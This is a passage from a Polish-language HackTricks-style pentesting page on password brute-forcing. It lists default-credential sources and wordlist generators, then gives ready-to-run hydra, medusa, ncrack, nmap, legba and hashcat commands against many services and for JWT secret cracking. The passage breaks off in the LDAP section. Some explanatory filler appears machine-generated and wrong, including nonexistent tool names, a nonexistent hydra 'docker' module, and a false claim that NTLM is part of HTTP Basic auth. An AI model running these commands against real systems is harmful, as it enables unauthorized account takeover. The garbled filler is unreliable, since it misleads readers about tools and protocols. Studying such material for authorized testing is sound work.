# Brute Force - Przegląd

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Domyślne poświadczenia

**Wyszukaj w Google** domyślne poświadczenia dla używanej technologii lub **spróbuj tych linków**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Stwórz własne słowniki**

Znajdź jak najwięcej informacji o celu i wygeneruj niestandardowy słownik. Narzędzia, które mogą pomóc:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl jest narzędziem do zbierania słowników z tekstów na stronach internetowych. Może być używany do tworzenia słowników do ataków brute-force.

Aby użyć Cewl, wykonaj następujące kroki:

1. Pobierz Cewl z repozytorium GitHub.
2. Uruchom Cewl, podając adres URL strony internetowej, z której chcesz pobrać tekst.
3. Cewl przeszuka stronę internetową i wyodrębni wszystkie słowa.
4. Możesz dostosować parametry Cewl, takie jak minimalna długość słowa, aby uzyskać bardziej precyzyjne wyniki.
5. Cewl zapisze słowa do pliku tekstowego, który można następnie wykorzystać jako słownik do ataków brute-force.

Cewl jest przydatnym narzędziem podczas testowania penetracyjnego, szczególnie podczas ataków brute-force, gdzie konieczne jest posiadanie słownika zawierającego potencjalne hasła.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Generuj hasła na podstawie twojej wiedzy o ofierze (imiona, daty...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister to narzędzie do generowania listy słów, które pozwala dostarczyć zestaw słów, dając możliwość tworzenia wielu wariacji na podstawie podanych słów, tworząc unikalną i idealną listę słów do użycia w odniesieniu do określonego celu.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listy słów

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Usługi

Posortowane alfabetycznie według nazwy usługi.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for communication between the web server and the application server.

#### Brute Forcing AJP

To brute force AJP, you can use tools like `ajpfuzzer` or `ajp-buster`. These tools allow you to test for weak credentials or vulnerabilities in the AJP protocol.

Here is an example of how to use `ajpfuzzer`:

```bash
ajpfuzzer -H <target_host> -p <target_port> -u <username> -w <wordlist>
```

Replace `<target_host>` with the IP address or hostname of the target server, `<target_port>` with the AJP port (usually 8009), `<username>` with the username you want to test, and `<wordlist>` with the path to a wordlist file containing possible passwords.

Similarly, you can use `ajp-buster` with the following command:

```bash
ajp-buster -u <target_url> -w <wordlist>
```

Replace `<target_url>` with the URL of the target server and `<wordlist>` with the path to a wordlist file.

Remember to always obtain proper authorization before performing any brute force attacks.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM i Solace)

AMQP (Advanced Message Queuing Protocol) to protokół komunikacyjny wykorzystywany do przesyłania wiadomości między aplikacjami. Jest wykorzystywany przez różne oprogramowanie do kolejkowania i przetwarzania wiadomości, takie jak ActiveMQ, RabbitMQ, Qpid, JORAM i Solace.

### Brute Force

#### ActiveMQ

ActiveMQ jest popularnym oprogramowaniem do kolejkowania wiadomości, które wykorzystuje protokół AMQP. Aby przeprowadzić atak brute force na ActiveMQ, można wykorzystać narzędzia takie jak Hydra lub Medusa. Poniżej przedstawiono przykładową komendę dla narzędzia Hydra:

```plaintext
hydra -L <lista_loginów> -P <lista_hasel> amqp://<adres_IP>:<port>
```

#### RabbitMQ

RabbitMQ to kolejne oprogramowanie do kolejkowania wiadomości, które obsługuje protokół AMQP. Aby przeprowadzić atak brute force na RabbitMQ, można również użyć narzędzi takich jak Hydra lub Medusa. Poniżej przedstawiono przykładową komendę dla narzędzia Hydra:

```plaintext
hydra -L <lista_loginów> -P <lista_hasel> amqp://<adres_IP>:<port>
```

#### Qpid

Qpid to kolejne oprogramowanie, które obsługuje protokół AMQP. Aby przeprowadzić atak brute force na Qpid, można użyć narzędzi takich jak Hydra lub Medusa. Poniżej przedstawiono przykładową komendę dla narzędzia Hydra:

```plaintext
hydra -L <lista_loginów> -P <lista_hasel> amqp://<adres_IP>:<port>
```

#### JORAM

JORAM to kolejne oprogramowanie, które wykorzystuje protokół AMQP. Aby przeprowadzić atak brute force na JORAM, można również użyć narzędzi takich jak Hydra lub Medusa. Poniżej przedstawiono przykładową komendę dla narzędzia Hydra:

```plaintext
hydra -L <lista_loginów> -P <lista_hasel> amqp://<adres_IP>:<port>
```

#### Solace

Solace to kolejne oprogramowanie, które obsługuje protokół AMQP. Aby przeprowadzić atak brute force na Solace, można użyć narzędzi takich jak Hydra lub Medusa. Poniżej przedstawiono przykładową komendę dla narzędzia Hydra:

```plaintext
hydra -L <lista_loginów> -P <lista_hasel> amqp://<adres_IP>:<port>
```

### Słownik ataków

W przypadku ataków brute force na AMQP, ważne jest posiadanie odpowiedniego słownika haseł. Można skorzystać z popularnych słowników, takich jak RockYou, lub dostosować słownik do konkretnego celu ataku.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra jest rozproszonym systemem zarządzania bazą danych, który jest wykorzystywany do przechowywania dużych ilości danych na wielu węzłach. Jest to popularne narzędzie w dziedzinie Big Data i jest często stosowane w aplikacjach internetowych, które wymagają wysokiej dostępności i skalowalności.

#### Atak Brute Force na Cassandra

Atak Brute Force na Cassandra polega na próbie odgadnięcia hasła do konta użytkownika poprzez wypróbowanie wszystkich możliwych kombinacji. Istnieje kilka narzędzi dostępnych do przeprowadzenia ataku Brute Force na Cassandra, takich jak Hydra, Medusa i Patator.

Aby przeprowadzić atak Brute Force na Cassandra, należy zebrać informacje o celu, takie jak nazwa użytkownika i adres IP serwera Cassandra. Następnie można użyć narzędzi do automatycznego przeprowadzenia ataku, podając listę możliwych haseł do sprawdzenia.

Ważne jest, aby wybrać odpowiednie narzędzie i dostosować parametry ataku, takie jak prędkość prób, aby uniknąć wykrycia i zablokowania przez system zabezpieczeń.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB jest bazą danych NoSQL, która przechowuje dane w formacie JSON i udostępnia interfejs HTTP do zarządzania danymi. Jedną z podstawowych metod ataku na CouchDB jest brute force, czyli próba odgadnięcia hasła poprzez wypróbowanie wszystkich możliwych kombinacji.

#### Metoda brute force

Metoda brute force polega na automatycznym wypróbowywaniu wszystkich możliwych kombinacji haseł, aż do znalezienia poprawnego. Istnieje wiele narzędzi dostępnych online, które mogą przeprowadzić atak brute force na CouchDB.

#### Zabezpieczenia przed atakami brute force

Aby zabezpieczyć się przed atakami brute force na CouchDB, można podjąć następujące kroki:

1. Użyj silnego hasła: Wybierz hasło, które jest trudne do odgadnięcia i zawiera kombinację liter, cyfr i znaków specjalnych.

2. Ogranicz liczbę prób logowania: Skonfiguruj CouchDB w taki sposób, aby blokował adresy IP, które przekraczają określoną liczbę prób logowania.

3. Użyj narzędzi do wykrywania ataków: Skorzystaj z narzędzi, które monitorują logi i wykrywają podejrzane aktywności, takie jak wielokrotne nieudane próby logowania.

4. Zaktualizuj oprogramowanie: Regularnie aktualizuj CouchDB do najnowszej wersji, aby korzystać z najnowszych zabezpieczeń.

5. Użyj VPN: Skonfiguruj CouchDB, aby wymagał połączenia VPN przed udostępnieniem dostępu do bazy danych.

#### Podsumowanie

Atak brute force na CouchDB jest jednym z podstawowych sposobów ataku na tę bazę danych. Aby zabezpieczyć się przed takimi atakami, należy stosować silne hasła, ograniczać liczbę prób logowania, korzystać z narzędzi do wykrywania ataków, regularnie aktualizować oprogramowanie i używać VPN.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Rejestr Docker

#### Brute Force

Brute force to metoda ataku, która polega na próbie odgadnięcia hasła poprzez wypróbowanie wszystkich możliwych kombinacji. W przypadku rejestrów Docker, brute force może być używany do próby odgadnięcia hasła dostępu do rejestrów prywatnych.

Aby przeprowadzić atak brute force na rejestr Docker, można skorzystać z narzędzi takich jak Hydra lub Patator. Te narzędzia umożliwiają automatyczne wypróbowanie różnych kombinacji haseł, aż do znalezienia poprawnego.

Przykład użycia narzędzia Hydra do ataku brute force na rejestr Docker:

```plaintext
hydra -l <username> -P <password_list> <target_ip> docker
```

Gdzie:
- `<username>` to nazwa użytkownika, którego próbujemy odgadnąć
- `<password_list>` to lista możliwych haseł
- `<target_ip>` to adres IP rejestracji Docker

Warto również pamiętać, że niektóre rejestracje Docker mogą być chronione przez mechanizmy zabezpieczeń, takie jak blokowanie po wielu nieudanych próbach logowania. W takich przypadkach atak brute force może być mniej skuteczny.

#### Słownik ataków

Słownik ataków to technika, która polega na próbie odgadnięcia hasła poprzez wypróbowanie różnych słów lub kombinacji słów, które mogą być powiązane z użytkownikiem lub kontekstem. W przypadku rejestrów Docker, słownik ataków może być używany do próby odgadnięcia hasła dostępu do rejestrów prywatnych.

Aby przeprowadzić atak słownikowy na rejestr Docker, można skorzystać z narzędzi takich jak Hydra lub Patator. Te narzędzia umożliwiają automatyczne wypróbowanie różnych słów lub kombinacji słów, aż do znalezienia poprawnego hasła.

Przykład użycia narzędzia Hydra do ataku słownikowego na rejestr Docker:

```plaintext
hydra -l <username> -P <dictionary_file> <target_ip> docker
```

Gdzie:
- `<username>` to nazwa użytkownika, którego próbujemy odgadnąć
- `<dictionary_file>` to plik zawierający słownik ataków
- `<target_ip>` to adres IP rejestracji Docker

Warto pamiętać, że skuteczność ataku słownikowego zależy od jakości słownika ataków. Im bardziej zróżnicowane i kompleksowe słowa zawiera słownik, tym większa szansa na odgadnięcie hasła.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch jest popularnym narzędziem do wyszukiwania i analizy danych. Jest często wykorzystywany w aplikacjach internetowych do przechowywania i przetwarzania dużych ilości danych. Elasticsearch oferuje wiele funkcji, takich jak pełnotekstowe wyszukiwanie, agregacje, filtrowanie i sortowanie danych.

#### Ataki Brute Force na Elasticsearch

Ataki Brute Force są jednym z najpopularniejszych sposobów atakowania systemów Elasticsearch. Polegają one na próbie odgadnięcia hasła, korzystając z różnych kombinacji znaków. Atakujący może wykorzystać słownik haseł lub generować losowe kombinacje.

#### Metody ochrony przed atakami Brute Force

Aby zabezpieczyć system Elasticsearch przed atakami Brute Force, można podjąć kilka środków ostrożności:

1. Użyj silnego hasła: Wybierz hasło, które jest trudne do odgadnięcia. Powinno zawierać kombinację dużych i małych liter, cyfr oraz znaków specjalnych.

2. Ogranicz liczbę prób logowania: Skonfiguruj Elasticsearch w taki sposób, aby blokował adresy IP, które przekraczają określoną liczbę prób logowania.

3. Użyj narzędzi do monitorowania: Wykorzystaj narzędzia monitorujące, które mogą wykrywać podejrzane aktywności, takie jak wielokrotne nieudane próby logowania.

4. Zaktualizuj oprogramowanie: Regularnie aktualizuj Elasticsearch do najnowszej wersji, aby korzystać z najnowszych poprawek zabezpieczeń.

5. Skonfiguruj dostęp do Elasticsearch: Ogranicz dostęp do Elasticsearch tylko do niezbędnych użytkowników i adresów IP.

6. Użyj dodatkowych warstw zabezpieczeń: Rozważ użycie dodatkowych narzędzi, takich jak firewall, aby zwiększyć ochronę systemu Elasticsearch.

Pamiętaj, że ochrona przed atakami Brute Force jest niezbędna, aby zapewnić bezpieczeństwo danych przechowywanych w Elasticsearch.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) jest protokołem używanym do transferu plików między klientem a serwerem. Atak brute force na FTP polega na próbie odgadnięcia prawidłowych poświadczeń logowania, poprzez wypróbowanie różnych kombinacji nazwy użytkownika i hasła. Poniżej przedstawiono kilka metod ataku brute force na FTP:

#### 1. Hydra

Hydra jest narzędziem do ataków brute force, które obsługuje wiele protokołów, w tym FTP. Można go użyć do automatycznego testowania wielu kombinacji nazw użytkowników i haseł w celu odgadnięcia prawidłowych poświadczeń logowania.

```plaintext
hydra -l <username> -P <password_list> ftp://<target_ip>
```

#### 2. Medusa

Medusa to kolejne narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym FTP. Może być używane do automatycznego testowania wielu kombinacji nazw użytkowników i haseł w celu odgadnięcia prawidłowych poświadczeń logowania.

```plaintext
medusa -u <username> -P <password_list> -h <target_ip> -M ftp
```

#### 3. Ncrack

Ncrack to narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym FTP. Może być używane do automatycznego testowania wielu kombinacji nazw użytkowników i haseł w celu odgadnięcia prawidłowych poświadczeń logowania.

```plaintext
ncrack -p 21 --user <username> -P <password_list> <target_ip>
```

#### 4. Brutus

Brutus to popularne narzędzie do ataków brute force, które obsługuje wiele protokołów, w tym FTP. Może być używane do automatycznego testowania wielu kombinacji nazw użytkowników i haseł w celu odgadnięcia prawidłowych poświadczeń logowania.

#### 5. Manualne testowanie

Jeśli narzędzia automatyczne nie przynoszą rezultatów, można przeprowadzić ręczne testowanie brute force. Polega to na ręcznym wprowadzaniu różnych kombinacji nazw użytkowników i haseł w celu odgadnięcia prawidłowych poświadczeń logowania.

Ważne jest, aby pamiętać, że ataki brute force są nielegalne i mogą prowadzić do konsekwencji prawnych. Należy zawsze działać zgodnie z prawem i uzyskać odpowiednie uprawnienia przed przeprowadzeniem testów penetracyjnych.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Ogólne Brute Force dla protokołu HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM (New Technology LAN Manager) to protokół uwierzytelniania używany w systemach Windows. Jest on często stosowany w protokołach HTTP, takich jak HTTP Basic Authentication, do uwierzytelniania użytkowników.

Atak brute force na uwierzytelnianie NTLM polega na próbie odgadnięcia hasła użytkownika, wykorzystując różne kombinacje znaków. Atakujący może używać różnych technik, takich jak słownikowe ataki, ataki oparte na regułach lub ataki hybrydowe, aby znaleźć poprawne hasło.

Aby przeprowadzić atak brute force na uwierzytelnianie NTLM, atakujący musi znać nazwę użytkownika i adres URL docelowego serwera. Następnie atakujący może użyć narzędzi do ataków brute force, takich jak Hydra, Medusa lub Burp Suite, aby automatycznie wypróbować różne kombinacje hasła.

Atak brute force na uwierzytelnianie NTLM może być czasochłonny i wymagać dużej mocy obliczeniowej. Dlatego ważne jest, aby stosować silne hasła i zabezpieczenia, takie jak blokowanie kont po kilku nieudanych próbach logowania, aby utrudnić atakującym odgadnięcie hasła.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Wysyłanie formularza metodą POST

Wysyłanie formularza metodą POST jest jednym z najczęściej stosowanych sposobów przesyłania danych na stronach internetowych. W przeciwieństwie do metody GET, która przesyła dane w adresie URL, metoda POST wysyła dane jako część ciała żądania HTTP.

Aby przeprowadzić atak brute-force na formularz, należy zrozumieć strukturę żądania POST. W przypadku formularzy HTML, można to zrobić, analizując kod źródłowy strony internetowej. Warto zwrócić uwagę na atrybuty `action` i `method` w tagu `<form>`. Atrybut `action` wskazuje na adres URL, do którego zostaną wysłane dane, a atrybut `method` określa metodę HTTP, która zostanie użyta (w tym przypadku POST).

Aby przeprowadzić atak brute-force, należy zautomatyzować wysyłanie żądań POST z różnymi kombinacjami danych logowania. Można to zrobić za pomocą narzędzi do automatyzacji, takich jak Burp Suite, cURL lub Python Requests.

Przykładowy kod w Pythonie, który wysyła żądanie POST, może wyglądać następująco:

```python
import requests

url = "https://example.com/login"
data = {
    "username": "admin",
    "password": "password123"
}

response = requests.post(url, data=data)
print(response.text)
```

W powyższym przykładzie wysyłamy żądanie POST na adres URL `https://example.com/login` z danymi logowania `username` i `password`. Odpowiedź serwera jest drukowana na konsoli.

Atak brute-force na formularz metodą POST polega na iteracyjnym wysyłaniu żądań POST z różnymi kombinacjami danych logowania, aż do znalezienia poprawnych danych uwierzytelniających. Jest to czasochłonny proces, który wymaga cierpliwości i odpowiednich narzędzi do automatyzacji.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Dla http**s** musisz zmienić z "http-post-form" na "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla lub (D)rupal lub (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) jest protokołem służącym do odbierania wiadomości e-mail z serwera. Można go wykorzystać do przeprowadzenia ataku brute-force na konta e-mail.

#### Brute-force na IMAP

Atak brute-force na IMAP polega na próbie odgadnięcia hasła do konta e-mail poprzez wypróbowanie różnych kombinacji haseł. Istnieje wiele narzędzi dostępnych online, które mogą przeprowadzić ten rodzaj ataku.

#### Metody ochrony przed atakiem brute-force na IMAP

Aby zabezpieczyć konto e-mail przed atakiem brute-force na IMAP, można podjąć następujące środki ostrożności:

- Używanie silnych haseł, które są trudne do odgadnięcia.
- Włączenie funkcji blokowania konta po określonej liczbie nieudanych prób logowania.
- Ustawienie długiego czasu oczekiwania między kolejnymi próbami logowania.
- Monitorowanie logów logowania w celu wykrycia podejrzanej aktywności.

#### Narzędzia do ataku brute-force na IMAP

Poniżej znajduje się lista popularnych narzędzi do przeprowadzania ataków brute-force na IMAP:

- Hydra
- Medusa
- Ncrack

#### Przykład użycia narzędzia Hydra do ataku brute-force na IMAP

```
hydra -S -l <username> -P <passwords_file> -e ns -V -s <port> <target_ip> imap
```

W powyższym przykładzie narzędzie Hydra jest używane do przeprowadzenia ataku brute-force na IMAP. Parametry `-S` i `-e ns` są używane do obsługi protokołu SSL/TLS. Parametr `-l` służy do podania nazwy użytkownika, `-P` do podania pliku z hasłami, `-V` do włączenia trybu szczegółowego, `-s` do określenia portu, a `<target_ip>` do podania adresu IP docelowego.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC (Internet Relay Chat) jest protokołem komunikacyjnym wykorzystywanym do czatu w czasie rzeczywistym. Jest szeroko stosowany w społecznościach internetowych i umożliwia użytkownikom komunikację za pomocą tekstowych wiadomości. 

#### Brute force na IRC

Brute force na IRC polega na próbie odgadnięcia hasła użytkownika, wykorzystując automatyczne narzędzia do generowania i testowania wielu kombinacji haseł. Istnieje wiele narzędzi dostępnych online, które mogą przeprowadzać ataki brute force na serwery IRC. 

Aby przeprowadzić atak brute force na IRC, należy zebrać informacje o serwerze IRC, takie jak adres IP, port i nazwę użytkownika. Następnie można użyć narzędzi do generowania i testowania haseł, aby próbować odgadnąć hasło użytkownika. 

Ataki brute force na IRC mogą być nielegalne i naruszać prywatność innych użytkowników. Zawsze należy działać zgodnie z prawem i uzyskać odpowiednie uprawnienia przed przeprowadzeniem jakiejkolwiek formy ataku.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

ISCSI (Internet Small Computer System Interface) jest protokołem komunikacyjnym, który umożliwia przesyłanie bloków danych między serwerem a urządzeniem pamięci masowej przez sieć IP. Protokół ten jest często wykorzystywany do zdalnego montowania dysków twardych i innych urządzeń pamięci masowej.

#### Ataki Brute Force na ISCSI

Ataki Brute Force na ISCSI polegają na próbie odgadnięcia hasła dostępu do serwera ISCSI poprzez wypróbowanie wszystkich możliwych kombinacji. Istnieje wiele narzędzi dostępnych do przeprowadzania takich ataków, takich jak Hydra, Medusa czy Patator.

Aby zabezpieczyć się przed atakami Brute Force na ISCSI, zaleca się stosowanie silnych haseł, ograniczenie liczby prób logowania oraz monitorowanie logów w celu wykrycia podejrzanej aktywności.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token (JWT) to otwarty standard (RFC 7519), który definiuje sposób bezpiecznego przesyłania informacji między stronami w formie obiektów JSON. JWT składa się z trzech części: nagłówka, ładunku (payload) i podpisu.

#### Nagłówek

Nagłówek JWT zawiera informacje o typie tokenu (typ: JWT) oraz algorytmie używanym do generowania podpisu. Przykład nagłówka JWT:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Ładunek (Payload)

Ładunek JWT zawiera dane, które chcemy przesyłać między stronami. Może zawierać informacje o użytkowniku, uprawnieniach, czasie ważności tokenu itp. Przykład ładunku JWT:

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

#### Podpis

Podpis JWT jest generowany na podstawie nagłówka, ładunku i tajnego klucza. Służy do weryfikacji integralności tokenu i autoryzacji. Przykład podpisu JWT:

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

#### Zastosowanie JWT

JWT jest często używany do uwierzytelniania i autoryzacji w aplikacjach internetowych. Po zalogowaniu, serwer generuje JWT i przesyła go do klienta. Klient następnie dołącza JWT do każdego żądania, a serwer weryfikuje jego autentyczność i uprawnienia. JWT jest również używany do bezpiecznego przechowywania informacji o sesji użytkownika.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) to protokół komunikacyjny używany do zarządzania i dostępu do informacji w katalogach internetowych. Jest często stosowany w systemach uwierzytelniania i autoryzacji, takich jak Active Directory. 

Ataki brute force na serwery LDAP są popularne w celu złamania haseł użytkowników. Atakujący próbują wielokrotnie logować się do serwera, używając różnych kombinacji haseł, aż do znalezienia poprawnego. 

Istnieje wiele narzędzi dostępnych do przeprowadzania ataków brute force na serwery LDAP, takich jak `ldapsearch`, `ldap-brute`, `ldapdomaindump` itp. 

Aby zabezpieczyć serwer LDAP przed atakami brute force, można podjąć kilka środków ostrożności, takich jak:
